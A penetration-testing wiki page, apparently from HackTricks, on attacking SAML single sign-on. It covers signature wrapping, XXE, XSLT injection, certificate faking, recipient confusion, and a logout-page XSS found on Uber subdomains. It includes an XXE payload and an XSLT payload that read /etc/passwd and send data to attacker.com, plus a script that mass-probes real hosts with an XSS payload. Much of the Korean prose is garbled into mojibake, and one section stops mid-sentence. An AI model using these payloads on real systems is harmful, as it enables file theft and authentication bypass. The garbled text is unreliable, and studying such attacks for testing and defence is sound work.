# SAML Attacks

## SAML Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## Tool

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): URL ë˜ëŠ” URL ëª©ë¡ì„ ê°€ì ¸ì™€ SAML consume URLì„ ì¶œë ¥í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤.

## XML round-trip

XMLì—ì„œ XMLì˜ ì„œëª…ëœ ë¶€ë¶„ì€ ë©”ëª¨ë¦¬ì— ì €ì¥ë˜ê³ , ê·¸ ë‹¤ìŒ ì¼ë¶€ ì¸ì½”ë”©/ë””ì½”ë”©ì´ ìˆ˜í–‰ë˜ë©° ì„œëª…ì´ í™•ì¸ë©ë‹ˆë‹¤. ì´ìƒì ìœ¼ë¡œ ê·¸ ì¸ì½”ë”©/ë””ì½”ë”©ì€ ë°ì´í„°ë¥¼ ë³€ê²½í•˜ì§€ ì•Šì•„ì•¼ í•˜ì§€ë§Œ, ê·¸ ì‹œë‚˜ë¦¬ì˜¤ì— ê¸°ë°˜í•˜ì—¬, **í™•ì¸ë˜ê³  ìˆëŠ” ë°ì´í„°ì™€ ì›ë³¸ ë°ì´í„°ê°€ ë™ì¼í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒ ì½”ë“œë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
REXML 3.2.4 ë˜ëŠ” ê·¸ ì´ì „ ë²„ì „ì—ì„œ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•˜ë©´ ëŒ€ì‹  ë‹¤ìŒê³¼ ê°™ì€ ì¶œë ¥ì´ ë°œìƒí•©ë‹ˆë‹¤:
```
First child in original doc: Y
First child after round-trip: Z
```
This is how REXML saw the original XML document from the program above:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (1001).png>)

And this is how it saw it after a round of parsing and serialization:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (445).png>)

For more information about the vulnerability and how to abuse it:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML Signature Wrapping Attacks

In **XML Signature Wrapping attacks (XSW)**, adversaries exploit a vulnerability arising when XML documents are processed through two distinct phases: **signature validation** and **function invocation**. These attacks involve altering the XML document structure. Specifically, the attacker **injects forged elements** that do not compromise the XML Signature's validity. This manipulation aims to create a discrepancy between the elements analyzed by the **application logic** and those checked by the **signature verification module**. As a result, while the XML Signature remains technically valid and passes verification, the application logic processes the **fraudulent elements**. Consequently, the attacker effectively bypasses the XML Signature's **integrity protection** and **origin authentication**, enabling the **injection of arbitrary content** without detection.

The following attacks are based on [**this blog post**](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) **and** [**this paper**](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf). So check those for further details.

### XSW #1

* **Strategy**: ì„œëª…ê³¼ í•¨ê»˜ ìƒˆë¡œìš´ ë£¨íŠ¸ ìš”ì†Œê°€ ì¶”ê°€ë©ë‹ˆë‹¤.
* **Implication**: ê²€ì¦ê¸°ê°€ í•©ë²•ì ì¸ "Response -> Assertion -> Subject"ì™€ ê³µê²©ìì˜ "ì•…ì˜ì ì¸ ìƒˆë¡œìš´ Response -> Assertion -> Subject" ì‚¬ì´ì—ì„œ í˜¼ë€ìŠ¤ëŸ¬ì›Œí•  ìˆ˜ ìˆì–´ ë°ì´í„° ë¬´ê²°ì„± ë¬¸ì œë¥¼ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (506).png>)

### XSW #2

* **Difference from XSW #1**: ê°ì‹¸ëŠ” ì„œëª… ëŒ€ì‹  ë¶„ë¦¬ëœ ì„œëª…ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.
* **Implication**: XSW #1ê³¼ ìœ ì‚¬í•œ "ì•…ì˜ì ì¸" êµ¬ì¡°ëŠ” ë¬´ê²°ì„± ê²€ì‚¬ë¥¼ í†µê³¼í•œ í›„ ë¹„ì¦ˆë‹ˆìŠ¤ ë…¼ë¦¬ë¥¼ ì†ì´ë ¤ëŠ” ëª©ì ì…ë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (466).png>)

### XSW #3

* **Strategy**: ì›ë˜ì˜ ì–´ì„¤ì…˜ê³¼ ë™ì¼í•œ ê³„ì¸µ ìˆ˜ì¤€ì—ì„œ ì•…ì˜ì ì¸ ì–´ì„¤ì…˜ì´ ì‘ì„±ë©ë‹ˆë‹¤.
* **Implication**: ë¹„ì¦ˆë‹ˆìŠ¤ ë…¼ë¦¬ê°€ ì•…ì˜ì ì¸ ë°ì´í„°ë¥¼ ì‚¬ìš©í•˜ë„ë¡ í˜¼ë€ì„ ì£¼ë ¤ëŠ” ì˜ë„ì…ë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (120).png>)

### XSW #4

* **Difference from XSW #3**: ì›ë˜ì˜ ì–´ì„¤ì…˜ì´ ë³µì œëœ (ì•…ì˜ì ì¸) ì–´ì„¤ì…˜ì˜ ìì‹ì´ ë©ë‹ˆë‹¤.
* **Implication**: XSW #3ê³¼ ìœ ì‚¬í•˜ì§€ë§Œ XML êµ¬ì¡°ë¥¼ ë” ê³µê²©ì ìœ¼ë¡œ ë³€ê²½í•©ë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (551).png>)

### XSW #5

* **Unique Aspect**: ì„œëª…ì´ë‚˜ ì›ë˜ ì–´ì„¤ì…˜ì´ í‘œì¤€ êµ¬ì„±(ê°ì‹¸ëŠ”/ê°ì‹¸ì§„/ë¶„ë¦¬ëœ)ì„ ë”°ë¥´ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **Implication**: ë³µì‚¬ëœ ì–´ì„¤ì…˜ì´ ì„œëª…ì„ ê°ì‹¸ë©°, ì˜ˆìƒë˜ëŠ” ë¬¸ì„œ êµ¬ì¡°ë¥¼ ìˆ˜ì •í•©ë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (1030).png>)

### XSW #6

* **Strategy**: XSW #4 ë° #5ì™€ ìœ ì‚¬í•œ ìœ„ì¹˜ ì‚½ì…ì´ì§€ë§Œ ë³€í˜•ì´ ìˆìŠµë‹ˆë‹¤.
* **Implication**: ë³µì‚¬ëœ ì–´ì„¤ì…˜ì´ ì„œëª…ì„ ê°ì‹¸ê³ , ê·¸ ì„œëª…ì´ ì›ë˜ ì–´ì„¤ì…˜ì„ ê°ì‹¸ë©° ì¤‘ì²©ëœ ê¸°ë§Œ êµ¬ì¡°ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (169).png>)

### XSW #7

* **Strategy**: ë³µì‚¬ëœ ì–´ì„¤ì…˜ì„ ìì‹ìœ¼ë¡œ í•˜ëŠ” Extensions ìš”ì†Œê°€ ì‚½ì…ë©ë‹ˆë‹¤.
* **Implication**: ì´ êµ¬ì¡°ëŠ” Extensions ìš”ì†Œì˜ ëœ ì œí•œì ì¸ ìŠ¤í‚¤ë§ˆë¥¼ ì´ìš©í•˜ì—¬ ìŠ¤í‚¤ë§ˆ ê²€ì¦ ë°©ì–´ ìˆ˜ë‹¨ì„ ìš°íšŒí•©ë‹ˆë‹¤, íŠ¹íˆ OpenSAMLê³¼ ê°™ì€ ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (971).png>)

### XSW #8

* **Difference from XSW #7**: ê³µê²©ì˜ ë³€í˜•ì„ ìœ„í•´ ë˜ ë‹¤ë¥¸ ëœ ì œí•œì ì¸ XML ìš”ì†Œë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.
* **Implication**: ì›ë˜ ì–´ì„¤ì…˜ì´ ëœ ì œí•œì ì¸ ìš”ì†Œì˜ ìì‹ì´ ë˜ì–´ XSW #7ì—ì„œ ì‚¬ìš©ëœ êµ¬ì¡°ë¥¼ ë°˜ì „ì‹œí‚µë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (541).png>)

### Tool

You can use the Burp extension [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) to parse the request, apply any XSW attack you choose, and launch it.

## XXE

If you don't know which kind of attacks are XXE, please read the following page:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

SAML Responses are **deflated and base64 encoded XML documents** and can be susceptible to XML External Entity (XXE) attacks. By manipulating the XML structure of the SAML Response, attackers can attempt to exploit XXE vulnerabilities. Hereâ€™s how such an attack can be visualized:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## Tools

Burp í™•ì¥ í”„ë¡œê·¸ë¨ [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)ë¥¼ ì‚¬ìš©í•˜ì—¬ SAML ìš”ì²­ì—ì„œ POCë¥¼ ìƒì„±í•˜ê³  ê°€ëŠ¥í•œ XXE ì·¨ì•½ì  ë° SAML ì·¨ì•½ì ì„ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ ì´ ê°•ì—°ë„ í™•ì¸í•´ ë³´ì„¸ìš”: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT via SAML

XSLTì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ ì°¸ì¡°í•˜ì„¸ìš”:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

í™•ì¥ ê°€ëŠ¥í•œ ìŠ¤íƒ€ì¼ì‹œíŠ¸ ì–¸ì–´ ë³€í™˜( XSLT )ì€ XML ë¬¸ì„œë¥¼ HTML, JSON ë˜ëŠ” PDFì™€ ê°™ì€ ë‹¤ì–‘í•œ í˜•ì‹ìœ¼ë¡œ ë³€í™˜í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **XSLT ë³€í™˜ì€ ë””ì§€í„¸ ì„œëª…ì˜ ê²€ì¦ ì „ì— ìˆ˜í–‰ëœë‹¤ëŠ” ì ì„ ì£¼ì˜í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.** ì´ëŠ” ìœ íš¨í•œ ì„œëª…ì´ ì—†ì–´ë„ ê³µê²©ì´ ì„±ê³µí•  ìˆ˜ ìˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ìì²´ ì„œëª…ëœ ì„œëª…ì´ë‚˜ ìœ íš¨í•˜ì§€ ì•Šì€ ì„œëª…ìœ¼ë¡œë„ ì§„í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì—¬ê¸°ì—ì„œ ì´ëŸ¬í•œ ì¢…ë¥˜ì˜ ì·¨ì•½ì ì„ í™•ì¸í•˜ê¸° ìœ„í•œ **POC**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, ì´ ì„¹ì…˜ì˜ ì‹œì‘ ë¶€ë¶„ì— ì–¸ê¸‰ëœ hacktricks í˜ì´ì§€ì—ì„œ í˜ì´ë¡œë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### Tool

Burp í™•ì¥ í”„ë¡œê·¸ë¨ [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)ë¥¼ ì‚¬ìš©í•˜ì—¬ SAML ìš”ì²­ì—ì„œ POCë¥¼ ìƒì„±í•˜ì—¬ ê°€ëŠ¥í•œ XSLT ì·¨ì•½ì ì„ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ ì´ ê°•ì—°ë„ í™•ì¸í•´ ë³´ì„¸ìš”: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML Signature Exclusion <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

**XML Signature Exclusion**ì€ Signature ìš”ì†Œê°€ ì—†ì„ ë•Œ SAML êµ¬í˜„ì˜ ë™ì‘ì„ ê´€ì°°í•©ë‹ˆë‹¤. ì´ ìš”ì†Œê°€ ëˆ„ë½ë˜ë©´ **ì„œëª… ê²€ì¦ì´ ë°œìƒí•˜ì§€ ì•Šì„ ìˆ˜ ìˆìœ¼ë©°**, ì´ëŠ” ì·¨ì•½ì ì„ ì´ˆë˜í•©ë‹ˆë‹¤. ì„œëª…ì— ì˜í•´ ì¼ë°˜ì ìœ¼ë¡œ ê²€ì¦ë˜ëŠ” ë‚´ìš©ì„ ë³€ê²½í•˜ì—¬ ì´ë¥¼ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (457).png>)

### Tool <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

Burp í™•ì¥ í”„ë¡œê·¸ë¨ [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. SAML ì‘ë‹µì„ ê°€ë¡œì±„ê³  `Remove Signatures`ë¥¼ í´ë¦­í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ **ëª¨ë“ ** Signature ìš”ì†Œê°€ ì œê±°ë©ë‹ˆë‹¤.

ì„œëª…ì´ ì œê±°ëœ ìƒíƒœì—ì„œ ìš”ì²­ì´ ëŒ€ìƒì—ê²Œ ì§„í–‰ë˜ë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤. ì„œë¹„ìŠ¤ì—ì„œ ì„œëª…ì´ í•„ìš”í•˜ì§€ ì•Šë‹¤ë©´

## Certificate Faking <a href="#certificate-faking" id="certificate-faking"></a>

## Certificate Faking

Certificate Fakingì€ **ì„œë¹„ìŠ¤ ì œê³µì(SP)ê°€ SAML ë©”ì‹œì§€ê°€ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ID ê³µê¸‰ì(IdP)ì— ì˜í•´ ì„œëª…ë˜ì—ˆëŠ”ì§€ ì œëŒ€ë¡œ ê²€ì¦í•˜ëŠ”ì§€ í…ŒìŠ¤íŠ¸í•˜ëŠ” ê¸°ìˆ **ì…ë‹ˆë‹¤. ì´ëŠ” SAML ì‘ë‹µ ë˜ëŠ” ì£¼ì¥ì„ ì„œëª…í•˜ê¸° ìœ„í•´ \***ìì²´ ì„œëª…ëœ ì¸ì¦ì„œ**ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ í¬í•¨í•˜ë©°, SPì™€ IdP ê°„ì˜ ì‹ ë¢° ê²€ì¦ í”„ë¡œì„¸ìŠ¤ë¥¼ í‰ê°€í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.

### How to Conduct Certificate Faking

ë‹¤ìŒ ë‹¨ê³„ëŠ” [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Burp í™•ì¥ì„ ì‚¬ìš©í•˜ì—¬ í”„ë¡œì„¸ìŠ¤ë¥¼ ì„¤ëª…í•©ë‹ˆë‹¤:

1. SAML ì‘ë‹µì„ ê°€ë¡œì±•ë‹ˆë‹¤.
2. ì‘ë‹µì— ì„œëª…ì´ í¬í•¨ë˜ì–´ ìˆìœ¼ë©´ `Send Certificate to SAML Raider Certs` ë²„íŠ¼ì„ ì‚¬ìš©í•˜ì—¬ ì¸ì¦ì„œë¥¼ SAML Raider Certsë¡œ ë³´ëƒ…ë‹ˆë‹¤.
3. SAML Raider Certificates íƒ­ì—ì„œ ê°€ì ¸ì˜¨ ì¸ì¦ì„œë¥¼ ì„ íƒí•˜ê³  `Save and Self-Sign`ì„ í´ë¦­í•˜ì—¬ ì›ë³¸ ì¸ì¦ì„œì˜ ìì²´ ì„œëª…ëœ ë³µì œë³¸ì„ ìƒì„±í•©ë‹ˆë‹¤.
4. Burpì˜ í”„ë¡ì‹œì—ì„œ ê°€ë¡œì±ˆ ìš”ì²­ìœ¼ë¡œ ëŒì•„ê°‘ë‹ˆë‹¤. XML Signature ë“œë¡­ë‹¤ìš´ì—ì„œ ìƒˆ ìì²´ ì„œëª…ëœ ì¸ì¦ì„œë¥¼ ì„ íƒí•©ë‹ˆë‹¤.
5. `Remove Signatures` ë²„íŠ¼ì„ ì‚¬ìš©í•˜ì—¬ ê¸°ì¡´ ì„œëª…ì„ ì œê±°í•©ë‹ˆë‹¤.
6. ì ì ˆí•œ ê²½ìš° **`(Re-)Sign Message`** ë˜ëŠ” **`(Re-)Sign Assertion`** ë²„íŠ¼ì„ ì‚¬ìš©í•˜ì—¬ ìƒˆ ì¸ì¦ì„œë¡œ ë©”ì‹œì§€ ë˜ëŠ” ì£¼ì¥ì„ ì„œëª…í•©ë‹ˆë‹¤.
7. ì„œëª…ëœ ë©”ì‹œì§€ë¥¼ ì „ë‹¬í•©ë‹ˆë‹¤. ì„±ê³µì ì¸ ì¸ì¦ì€ SPê°€ ê·€í•˜ì˜ ìì²´ ì„œëª…ëœ ì¸ì¦ì„œë¡œ ì„œëª…ëœ ë©”ì‹œì§€ë¥¼ ìˆ˜ë½í•¨ì„ ë‚˜íƒ€ë‚´ë©°, SAML ë©”ì‹œì§€ì˜ ê²€ì¦ í”„ë¡œì„¸ìŠ¤ì—ì„œ ì ì¬ì ì¸ ì·¨ì•½ì ì„ ë“œëŸ¬ëƒ…ë‹ˆë‹¤.

## Token Recipient Confusion / Service Provider Target Confusion <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Token Recipient Confusion ë° Service Provider Target Confusionì€ **ì„œë¹„ìŠ¤ ì œê³µìê°€ ì‘ë‹µì˜ ì˜ë„ëœ ìˆ˜ì‹ ìë¥¼ ì˜¬ë°”ë¥´ê²Œ ê²€ì¦í•˜ëŠ”ì§€ í™•ì¸í•˜ëŠ” ê²ƒ**ê³¼ ê´€ë ¨ì´ ìˆìŠµë‹ˆë‹¤. ë³¸ì§ˆì ìœ¼ë¡œ, ì„œë¹„ìŠ¤ ì œê³µìëŠ” ë‹¤ë¥¸ ì œê³µìë¥¼ ìœ„í•´ ì˜ë„ëœ ê²½ìš° ì¸ì¦ ì‘ë‹µì„ ê±°ë¶€í•´ì•¼ í•©ë‹ˆë‹¤. ì—¬ê¸°ì„œ ì¤‘ìš”í•œ ìš”ì†ŒëŠ” SAML ì‘ë‹µì˜ **SubjectConfirmationData** ìš”ì†Œ ë‚´ì— ìˆëŠ” **Recipient** í•„ë“œì…ë‹ˆë‹¤. ì´ í•„ë“œëŠ” Assertionì´ ì „ì†¡ë˜ì–´ì•¼ í•˜ëŠ” URLì„ ì§€ì •í•©ë‹ˆë‹¤. ì‹¤ì œ ìˆ˜ì‹ ìê°€ ì˜ë„ëœ ì„œë¹„ìŠ¤ ì œê³µìì™€ ì¼ì¹˜í•˜ì§€ ì•Šìœ¼ë©´ Assertionì€ ìœ íš¨í•˜ì§€ ì•Šì€ ê²ƒìœ¼ë¡œ ê°„ì£¼ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

#### **How It Works**

SAML Token Recipient Confusion (SAML-TRC) ê³µê²©ì´ ê°€ëŠ¥í•˜ë ¤ë©´ íŠ¹ì • ì¡°ê±´ì´ ì¶©ì¡±ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. ì²«ì§¸, ì„œë¹„ìŠ¤ ì œê³µì(SP-Legit)ì— ìœ íš¨í•œ ê³„ì •ì´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. ë‘˜ì§¸, ëª©í‘œ ì„œë¹„ìŠ¤ ì œê³µì(SP-Target)ëŠ” SP-Legitì— ì„œë¹„ìŠ¤ë¥¼ ì œê³µí•˜ëŠ” ë™ì¼í•œ ID ê³µê¸‰ìë¡œë¶€í„° í† í°ì„ ìˆ˜ë½í•´ì•¼ í•©ë‹ˆë‹¤.

ì´ëŸ¬í•œ ì¡°ê±´ì—ì„œ ê³µê²© í”„ë¡œì„¸ìŠ¤ëŠ” ê°„ë‹¨í•©ë‹ˆë‹¤. ê³µìœ ëœ ID ê³µê¸‰ìë¥¼ í†µí•´ SP-Legitì™€ì˜ ì§„ì •í•œ ì„¸ì…˜ì´ ì‹œì‘ë©ë‹ˆë‹¤. ID ê³µê¸‰ìë¡œë¶€í„° SP-Legitìœ¼ë¡œì˜ SAML ì‘ë‹µì´ ê°€ë¡œì±„ì§‘ë‹ˆë‹¤. ì´ ê°€ë¡œì±ˆ SAML ì‘ë‹µì€ ì›ë˜ SP-Legitì„ ìœ„í•´ ì˜ë„ëœ ê²ƒì´ë©°, SP-Targetìœ¼ë¡œ ë¦¬ë””ë ‰ì…˜ë©ë‹ˆë‹¤. ì´ ê³µê²©ì˜ ì„±ê³µì€ SP-Targetì´ Assertionì„ ìˆ˜ë½í•˜ì—¬ SP-Legitì— ì‚¬ìš©ëœ ë™ì¼í•œ ê³„ì • ì´ë¦„ìœ¼ë¡œ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ì ‘ê·¼ì„ ë¶€ì—¬í•˜ëŠ”ì§€ì— ì˜í•´ ì¸¡ì •ë©ë‹ˆë‹¤.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## ë¡œê·¸ì•„ì›ƒ ê¸°ëŠ¥ì˜ XSS

ì›ë³¸ ì—°êµ¬ëŠ” [ì´ ë§í¬](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)ë¥¼ í†µí•´ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë””ë ‰í† ë¦¬ ë¸Œë£¨íŠ¸ í¬ì‹± ê³¼ì •ì—ì„œ ë¡œê·¸ì•„ì›ƒ í˜ì´ì§€ê°€ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
ì´ ë§í¬ì— ì ‘ê·¼í•˜ë©´ ë‹¤ìŒìœ¼ë¡œ ë¦¬ë””ë ‰ì…˜ë©ë‹ˆë‹¤:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
ì´ê²ƒì€ `base` ë§¤ê°œë³€ìˆ˜ê°€ URLì„ í—ˆìš©í•œë‹¤ëŠ” ê²ƒì„ ë“œëŸ¬ëƒˆìŠµë‹ˆë‹¤. ì´ë¥¼ ê³ ë ¤í•˜ì—¬, XSS (êµì°¨ ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ…) ê³µê²©ì„ ì‹œì‘í•˜ê¸° ìœ„í•´ URLì„ `javascript:alert(123);`ë¡œ ëŒ€ì²´í•˜ëŠ” ì•„ì´ë””ì–´ê°€ ë– ì˜¬ëìŠµë‹ˆë‹¤.

### ëŒ€ëŸ‰ ì•…ìš©

[ì´ ì—°êµ¬ì—ì„œ](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) ë„êµ¬ëŠ” ë™ì¼í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ëŠ” ë„ë©”ì¸ì— ëŒ€í•´ `uberinternal.com`ì˜ í•˜ìœ„ ë„ë©”ì¸ì„ ë¶„ì„í•˜ëŠ” ë° ì‚¬ìš©ë˜ì—ˆìŠµë‹ˆë‹¤. ì´í›„ `oidauth/prompt` í˜ì´ì§€ë¥¼ íƒ€ê²Ÿìœ¼ë¡œ í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ê°€ ê°œë°œë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” ë°ì´í„°ë¥¼ ì…ë ¥í•˜ê³  ì¶œë ¥ì— ë°˜ì˜ë˜ëŠ”ì§€ í™•ì¸í•˜ì—¬ XSS (êµì°¨ ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ…)ë¥¼ í…ŒìŠ¤íŠ¸í•©ë‹ˆë‹¤. ì…ë ¥ì´ ì‹¤ì œë¡œ ë°˜ì˜ë˜ëŠ” ê²½ìš°, ìŠ¤í¬ë¦½íŠ¸ëŠ” í•´ë‹¹ í˜ì´ì§€ë¥¼ ì·¨ì•½í•˜ë‹¤ê³  í‘œì‹œí•©ë‹ˆë‹¤.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## References

